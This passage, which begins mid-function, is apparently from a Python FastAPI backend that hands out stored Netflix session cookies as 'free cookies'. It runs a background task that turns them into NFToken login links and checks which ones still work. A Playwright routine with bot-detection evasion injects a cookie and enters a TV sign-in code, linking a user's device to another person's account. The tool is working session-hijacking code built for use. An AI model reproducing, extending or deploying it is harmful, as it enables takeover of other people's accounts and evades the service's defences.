    cookies = await db.free_cookies.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    setting = await db.settings.find_one({"key": "free_cookies_limit"}, {"_id": 0})
    limit = setting["value"] if setting else 10
    return {"cookies": cookies, "display_limit": limit}

@api_router.delete("/admin/free-cookies/{cookie_id}")
async def delete_free_cookie(cookie_id: str, user: dict = Depends(require_admin)):
    result = await db.free_cookies.delete_one({"id": cookie_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Free cookie not found")
    return {"message": "Free cookie deleted"}

@api_router.patch("/admin/free-cookies/limit")
async def set_free_cookies_limit(data: FreeCookieLimitUpdate, user: dict = Depends(require_admin)):
    await db.settings.update_one(
        {"key": "free_cookies_limit"},
        {"$set": {"key": "free_cookies_limit", "value": data.limit}},
        upsert=True
    )
    return {"message": "Limit updated", "limit": data.limit}

@api_router.get("/free-cookies")
async def get_free_cookies(user: dict = Depends(get_current_user)):
    setting = await db.settings.find_one({"key": "free_cookies_limit"}, {"_id": 0})
    limit = setting["value"] if setting else 10
    cookies = await db.free_cookies.find({}, {"_id": 0}).sort("created_at", -1).to_list(limit)
    # Strip sensitive cookie data for non-admin users
    if not user.get("is_master"):
        for c in cookies:
            c.pop("browser_cookies", None)
    return cookies

@api_router.post("/admin/free-cookies/refresh")
async def force_refresh_tokens(user: dict = Depends(require_admin)):
    """Manually trigger NFToken refresh for all free cookies and check if alive"""
    free_cookies = await db.free_cookies.find({}, {"_id": 0}).to_list(500)
    if not free_cookies:
        return {"message": "No free cookies to refresh", "refreshed": 0, "dead": 0, "total": 0}

    refreshed = 0
    dead = 0
    for fc in free_cookies:
        try:
            cookies_dict = None
            if fc.get("browser_cookies"):
                cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
            if (not cookies_dict or not cookies_dict.get("NetflixId")) and fc.get("full_cookie"):
                cookies_dict = parse_cookies_auto(fc["full_cookie"])
            if not cookies_dict:
                await db.free_cookies.update_one(
                    {"id": fc["id"]},
                    {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
                )
                dead += 1
                continue
            success, nft, nft_err = await generate_nftoken(cookies_dict)
            if success and nft:
                await db.free_cookies.update_one(
                    {"id": fc["id"]},
                    {"$set": {
                        "nftoken": nft,
                        "nftoken_link": f"https://netflix.com/?nftoken={nft}",
                        "is_alive": True,
                        "last_refreshed": datetime.now(timezone.utc).isoformat()
                    }}
                )
                refreshed += 1
            else:
                await db.free_cookies.update_one(
                    {"id": fc["id"]},
                    {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
                )
                dead += 1
        except Exception:
            pass

    return {"message": f"Refreshed {refreshed} alive, {dead} dead out of {len(free_cookies)}", "refreshed": refreshed, "dead": dead, "total": len(free_cookies)}

# --- TV Sign-In Code ---
async def activate_tv_code(cookies: dict, code: str):
    """Use Playwright to enter a TV sign-in code on netflix.com/tv8"""
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--disable-blink-features=AutomationControlled']
            )
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                viewport={'width': 1920, 'height': 1080},
                locale='en-US'
            )

            cookie_list = [{
                "name": name, "value": value,
                "domain": ".netflix.com", "path": "/",
                "secure": True, "sameSite": "None"
            } for name, value in cookies.items()]
            await context.add_cookies(cookie_list)

            page = await context.new_page()
            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

            # Navigate to TV sign-in page
            await page.goto("https://www.netflix.com/clearbrowsinghistory/tv8", timeout=25000)
            await page.wait_for_load_state("domcontentloaded", timeout=15000)
            await page.wait_for_timeout(2000)

            url = page.url
            if '/login' in url or '/LoginHelp' in url:
                await browser.close()
                return False, "Cookie expired - redirected to login"

            # Try netflix.com/tv8 directly
            await page.goto("https://www.netflix.com/tv8", timeout=25000)
            await page.wait_for_load_state("domcontentloaded", timeout=15000)
            await page.wait_for_timeout(3000)

            url = page.url
            if '/login' in url or '/LoginHelp' in url:
                await browser.close()
                return False, "Cookie expired - redirected to login"

            # Clean the code (remove spaces/dashes)
            clean_code = code.replace(' ', '').replace('-', '').strip()

            # Try to find and fill the code input
            filled = False

            # Method 1: Look for individual digit inputs
            digit_inputs = page.locator('input[type="tel"], input[type="text"], input[type="number"]')
            count = await digit_inputs.count()

            if count >= len(clean_code):
                # Multiple individual digit inputs
                for i, digit in enumerate(clean_code):
                    if i < count:
                        await digit_inputs.nth(i).fill(digit)
                        await page.wait_for_timeout(200)
                filled = True
            elif count == 1:
                # Single input for full code
                await digit_inputs.first.fill(clean_code)
                filled = True

            if not filled:
                # Method 2: Try common selectors
                for selector in ['input[name="pin"]', 'input[data-uia="pin-input"]', 'input.pin-input', '#code-input', 'input']:
                    try:
                        el = page.locator(selector).first
                        if await el.is_visible(timeout=2000):
                            await el.fill(clean_code)
                            filled = True
                            break
                    except Exception:
                        continue

            if not filled:
                await browser.close()
                return False, "Could not find code input field on the page"

            await page.wait_for_timeout(1000)

            # Try to submit
            submitted = False
            for selector in ['button[type="submit"]', 'button[data-uia="action-button"]', 'button:has-text("Continue")', 'button:has-text("Activate")', 'button:has-text("Next")', 'button:has-text("Sign In")']:
                try:
                    btn = page.locator(selector).first
                    if await btn.is_visible(timeout=2000):
                        await btn.click()
                        submitted = True
                        break
                except Exception:
                    continue

            if not submitted:
                # Try pressing Enter
                await page.keyboard.press("Enter")

            await page.wait_for_timeout(5000)

            # Check result
            final_url = page.url
            page_text = await page.inner_text('body')

            await browser.close()

            # Check for success indicators
            if any(kw in page_text.lower() for kw in ['success', 'activated', 'signed in', 'enjoy', 'start watching', 'welcome']):
                return True, "TV device activated successfully!"
            elif any(kw in page_text.lower() for kw in ['invalid', 'expired', 'incorrect', 'try again', 'error']):
                return False, "Invalid or expired code. Please try again with a new code from your TV."
            elif '/browse' in final_url or '/profiles' in final_url:
                return True, "TV device activated! Code accepted."
            else:
                return True, "Code submitted. Check your TV — it should be signed in now."

    except Exception as e:
        logger.error(f"TV code activation error: {e}")
        return False, f"Activation failed: {str(e)}"

@api_router.post("/tv-code")
async def submit_tv_code(data: TVCodeRequest, user: dict = Depends(get_current_user)):
    """Activate a TV device using a free cookie and a sign-in code"""
    if not data.code.strip():
        raise HTTPException(status_code=400, detail="Enter a TV sign-in code")

    # Get the free cookie
    fc = await db.free_cookies.find_one({"id": data.cookie_id}, {"_id": 0})
    if not fc:
        raise HTTPException(status_code=404, detail="Cookie not found")

    # Parse cookies
    cookies_dict = None
    if fc.get("browser_cookies"):
        cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
    if (not cookies_dict or not cookies_dict.get("NetflixId")) and fc.get("full_cookie"):
        cookies_dict = parse_cookies_auto(fc["full_cookie"])

    if not cookies_dict:
        raise HTTPException(status_code=400, detail="Cookie data is invalid")

    success, message = await activate_tv_code(cookies_dict, data.code)
    return {"success": success, "message": message}

# --- NFToken Auto-Refresh for Free Cookies ---
NFTOKEN_REFRESH_INTERVAL = 10 * 60  # 10 minutes in seconds

# Month name translations to English
MONTH_MAP = {
    'janvier': 'January', 'février': 'February', 'mars': 'March', 'avril': 'April',
    'mai': 'May', 'juin': 'June', 'juillet': 'July', 'août': 'August',
    'septembre': 'September', 'octobre': 'October', 'novembre': 'November', 'décembre': 'December',
    'enero': 'January', 'febrero': 'February', 'marzo': 'March', 'abril': 'April',
    'mayo': 'May', 'junio': 'June', 'julio': 'July', 'agosto': 'August',
    'septiembre': 'September', 'octubre': 'October', 'noviembre': 'November', 'diciembre': 'December',
    'janeiro': 'January', 'fevereiro': 'February', 'março': 'March',
    'junho': 'June', 'julho': 'July', 'setembro': 'September', 'outubro': 'October',
    'dezembro': 'December',
    'januar': 'January', 'februar': 'February', 'märz': 'March',
    'juni': 'June', 'juli': 'July', 'oktober': 'October', 'dezember': 'December',
}

def format_member_since(raw: str) -> str:
    """Clean up member_since to 'Month Year' format"""
    if not raw:
        return None
    # Decode any remaining \xNN escapes
    cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw)
    cleaned = cleaned.strip()
    # Translate month names to English (use word boundaries to avoid partial matches)
    for foreign, english in MONTH_MAP.items():
        cleaned = re.sub(r'\b' + re.escape(foreign) + r'\b', english, cleaned, flags=re.IGNORECASE)
    # Extract month and year
    match = re.search(r'([A-Za-zéû]+)\s*(\d{4})', cleaned)
    if match:
        return f"{match.group(1)} {match.group(2)}"
    return cleaned

def normalize_plan_name(raw_plan: str) -> str:
    """Normalize plan name from any Netflix format/language to standard English display name"""
    if not raw_plan:
        return None
    p = raw_plan.strip().lower()
    
    # Direct mappings for known plan identifiers and variations
    plan_map = {
        # Premium variants (check BEFORE standard since "standard" is substring)
        'premium': 'Premium (UHD)',
        'premium (uhd)': 'Premium (UHD)',
        'premium uhd': 'Premium (UHD)',
        'premium (4k)': 'Premium (UHD)',
        'premium 4k': 'Premium (UHD)',
        'ultra hd': 'Premium (UHD)',
        'offre premium': 'Premium (UHD)',
        'piano premium': 'Premium (UHD)',
        'plano premium': 'Premium (UHD)',
        'plan premium': 'Premium (UHD)',
        'premium-plan': 'Premium (UHD)',
        # Standard with ads variants (check BEFORE plain standard)
        'standard with ads': 'Standard with ads',
        'standard avec pub': 'Standard with ads',
        'standard con anuncios': 'Standard with ads',
        'standard com anúncios': 'Standard with ads',
        'standard mit werbung': 'Standard with ads',
        'standard con pubblicità': 'Standard with ads',
        'offre standard avec pub': 'Standard with ads',
        'offre essentiel': 'Standard with ads',
        # Standard variants
        'standard': 'Standard (HD)',
        'standard (hd)': 'Standard (HD)',
        'standard hd': 'Standard (HD)',
        'offre standard': 'Standard (HD)',
        'piano standard': 'Standard (HD)',
        'plano padrão': 'Standard (HD)',
        'plano standard': 'Standard (HD)',
        'plan standard': 'Standard (HD)',
        'plan estándar': 'Standard (HD)',
        'estándar': 'Standard (HD)',
        'estandar': 'Standard (HD)',
        'padrão': 'Standard (HD)',
        'padrao': 'Standard (HD)',
        'standard-plan': 'Standard (HD)',
        # Basic variants
        'basic': 'Basic',
        'basic with ads': 'Basic with ads',
        'básico': 'Basic',
        'basico': 'Basic',
        'offre basique': 'Basic',
        'básico com anúncios': 'Basic with ads',
        'básico con anuncios': 'Basic with ads',
        # Mobile
        'mobile': 'Mobile',
        'móvil': 'Mobile',
    }
    
    # Exact match first
    if p in plan_map:
        return plan_map[p]
    
    # Partial match - but check longer keys first to avoid premature matches
    sorted_keys = sorted(plan_map.keys(), key=len, reverse=True)
    for key in sorted_keys:
        if key in p:
            return plan_map[key]
    
    # If nothing matched, return the original with title case
    return raw_plan.strip().title()

def parse_cookie_string_to_dict(cookie_str: str) -> dict:
    """Parse 'key1=val1; key2=val2' string into a dict"""
    cookies = {}
    for pair in cookie_str.split(';'):
        pair = pair.strip()
        if '=' in pair:
            k, _, v = pair.partition('=')
            cookies[k.strip()] = v.strip()
    return cookies

async def refresh_free_cookie_tokens():
    """Background task that refreshes NFTokens for all free cookies every 10 minutes and checks if alive"""
    first_run = True
    while True:
        try:
            if first_run:
                await asyncio.sleep(10)  # Brief delay on startup before first refresh
                first_run = False
            else:
                await asyncio.sleep(NFTOKEN_REFRESH_INTERVAL)
            free_cookies = await db.free_cookies.find({}, {"_id": 0}).to_list(500)
            if not free_cookies:
                continue

            logger.info(f"NFToken refresh: processing {len(free_cookies)} free cookies")
            refreshed = 0
            dead = 0

            for fc in free_cookies:
                try:
                    cookies_dict = None
                    if fc.get("browser_cookies"):
                        cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
                    if (not cookies_dict or not cookies_dict.get("NetflixId")) and fc.get("full_cookie"):
                        cookies_dict = parse_cookies_auto(fc["full_cookie"])

                    if not cookies_dict:
                        await db.free_cookies.update_one(
                            {"id": fc["id"]},
                            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
                        )
                        dead += 1
                        continue

                    success, nft, nft_err = await generate_nftoken(cookies_dict)
                    if success and nft:
                        await db.free_cookies.update_one(
                            {"id": fc["id"]},
                            {"$set": {
                                "nftoken": nft,
                                "nftoken_link": f"https://netflix.com/?nftoken={nft}",
                                "is_alive": True,
                                "last_refreshed": datetime.now(timezone.utc).isoformat()
                            }}
                        )
                        refreshed += 1
                    else:
                        await db.free_cookies.update_one(
                            {"id": fc["id"]},
                            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
                        )
                        dead += 1
                        logger.warning(f"NFToken refresh failed for {fc['id']}: {nft_err}")
                except Exception as e:
                    logger.warning(f"NFToken refresh error for {fc['id']}: {e}")

            logger.info(f"NFToken refresh complete: {refreshed} alive, {dead} dead out of {len(free_cookies)}")
        except asyncio.CancelledError:
            logger.info("NFToken refresh task cancelled")
            break
        except Exception as e:
            logger.error(f"NFToken refresh task error: {e}")
            await asyncio.sleep(60)  # Wait a minute on error before retrying

_refresh_task = None

# Include router
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@app.on_event("startup")
async def seed_master_key():
    global _refresh_task
    master_key = os.environ['MASTER_KEY']
    existing = await db.access_keys.find_one({"is_master": True}, {"_id": 0})
    if not existing:
        await db.access_keys.insert_one({
            "id": str(uuid.uuid4()),
            "key_value": master_key,
            "label": "Master Key",
            "max_devices": 999,
            "active_sessions": [],
            "is_master": True,
            "created_at": datetime.now(timezone.utc).isoformat()
        })
        logger.info("Master key seeded")
    elif existing["key_value"] != master_key:
        await db.access_keys.update_one({"is_master": True}, {"$set": {"key_value": master_key}})
        logger.info("Master key updated")

    _refresh_task = asyncio.create_task(refresh_free_cookie_tokens())
    logger.info("NFToken auto-refresh task started (every 10 min)")

@app.on_event("shutdown")
async def shutdown_db_client():
    global _refresh_task
    if _refresh_task:
        _refresh_task.cancel()
        try:
            await _refresh_task
        except asyncio.CancelledError:
            pass
    client.close()
